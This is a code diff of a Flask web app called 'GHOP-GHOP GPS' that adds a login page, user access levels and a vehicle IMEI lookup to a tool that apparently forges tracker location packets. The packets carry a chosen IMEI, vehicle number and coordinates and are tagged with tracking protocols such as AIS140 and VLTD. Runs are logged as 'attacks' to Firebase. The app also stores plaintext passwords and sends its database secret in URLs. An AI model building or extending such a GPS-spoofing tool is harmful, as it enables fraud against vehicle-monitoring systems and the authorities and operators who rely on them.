@@ -15,7 +15,33 @@ status = {"firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.298801"
 def get_ist_time():
     return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
 
-# --- DASHBOARD HTML (With Tag Rotation Fix) ---
+LOGIN_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NITRO V82 - LOGIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
+        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>🫦 GHOP-GHOP GPS</h2>
+        {% if error %}<div style="color:red; font-size:12px; margin-bottom:10px;">{{error}}</div>{% endif %}
+        <form method="post">
+            <input type="text" name="userid" placeholder="USER ID" required>
+            <input type="password" name="password" placeholder="PASSWORD" required>
+            <button class="btn">LOGIN</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
 DASH_HTML = """
 <!DOCTYPE html>
 <html>
@@ -63,11 +89,12 @@ DASH_HTML = """
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
         var marker = L.marker([{{lat or 25.298801}}, {{lon or 84.651033}}]).addTo(map);
         function updateMap(lat, lon) { let pos = [parseFloat(lat), parseFloat(lon)]; map.setView(pos, 15); marker.setLatLng(pos); }
+        function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { let lt = pos.coords.latitude.toFixed(6); let ln = pos.coords.longitude.toFixed(6); document.getElementById('lat').value = lt; document.getElementById('lon').value = ln; updateMap(lt, ln); updatePreview(); }, (err) => alert("Error: " + err.message), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }); } }
         
         function updatePreview() {
             let tags = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"];
             let count = parseInt(document.getElementById('cnt').innerText) || 0;
-            let tag = tags[count % tags.length]; // LIVE ROTATION FIX
+            let tag = tags[count % tags.length];
             let imei = document.getElementById('imei').value;
             let vno = document.getElementById('vno').value;
             let lat = parseFloat(document.getElementById('lat').value || 0).toFixed(6);
@@ -89,6 +116,7 @@ DASH_HTML = """
             if(d.firing) document.getElementById('preview').innerText = d.last_pkt;
             else updatePreview();
         }); }, 1000);
+        updatePreview();
     </script>
 </body>
 </html>
@@ -97,12 +125,11 @@ DASH_HTML = """
 def log_to_firebase():
     try:
         now = get_ist_time()
-        # Nayi Session ID har attack ko alag folder mein rakhegi
         sid = status["session_id"]
+        # History updated with Session ID
         path = f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{session['user']}/{status['vno']}/{sid}.json?auth={FB_SECRET}"
-        log_data = {"Vehicle_No": status["vno"], "IMEI_No": status["imei"], "Lat": status["lat"], "Lon": status["lon"], "Start_Time": now.strftime('%H:%M:%S')}
+        log_data = {"Vehicle_No": status["vno"], "IMEI_No": status["imei"], "Lat": status["lat"], "Lon": status["lon"], "Start_Time": now.strftime('%H:%M:%S'), "Status": "Active"}
         requests.put(path, json=log_data, timeout=5)
-        # Latest record update for callback
         requests.put(f"{FB_URL}/Data_Records/{status['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
     except: pass
 
@@ -121,11 +148,31 @@ def firing_engine():
             time.sleep(0.02)
         except: time.sleep(1)
 
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if 'user' in session: return redirect(url_for('dashboard'))
+    error = None
+    if request.method == 'POST':
+        uid, pw = request.form.get('userid', '').strip(), request.form.get('password', '').strip()
+        data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
+        if data and str(data.get('password')) == str(pw):
+            session['user'], session['access_level'] = uid, data.get('access_level', 'basic')
+            session['def_lat'], session['def_lon'] = str(data.get('lat', '25.298801')), str(data.get('lon', '84.651033'))
+            status.update({"lat": session['def_lat'], "lon": session['def_lon']})
+            return redirect(url_for('dashboard'))
+        error = "INVALID ID OR PASSWORD"
+    return render_template_string(LOGIN_HTML, error=error)
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user' not in session: return redirect(url_for('login'))
+    return render_template_string(DASH_HTML, session=session, **status)
+
 @app.route('/action', methods=['POST'])
 def action():
+    if 'user' not in session: return redirect(url_for('login'))
     val = request.form.get('btn')
     if val == "start" and not status["firing"]:
-        # Har naye attack ke liye unique ID
         status["session_id"] = get_ist_time().strftime('%H%M%S')
         status.update({"imei": request.form.get('imei').strip(), "vno": request.form.get('vno').upper().strip(), "lat": request.form.get('lat').strip(), "lon": request.form.get('lon').strip(), "firing": True})
         log_to_firebase()
@@ -134,4 +181,17 @@ def action():
     elif val == "reset": status.update({"firing": False, "count": 0, "imei": "", "vno": "", "lat": session.get('def_lat'), "lon": session.get('def_lon')})
     return redirect(url_for('dashboard'))
 
-# (Baki login, dashboard, logout logic same rahenge)
+@app.route('/check_vehicle')
+def check_vehicle():
+    vno = request.args.get('vno', '').upper().strip()
+    data = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}").json()
+    return jsonify({"imei": data.get('IMEI_No')}) if data else jsonify({"imei": None})
+
+@app.route('/data')
+def data(): return jsonify(status)
+
+@app.route('/logout', methods=['POST'])
+def logout(): session.clear(); return redirect(url_for('login'))
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
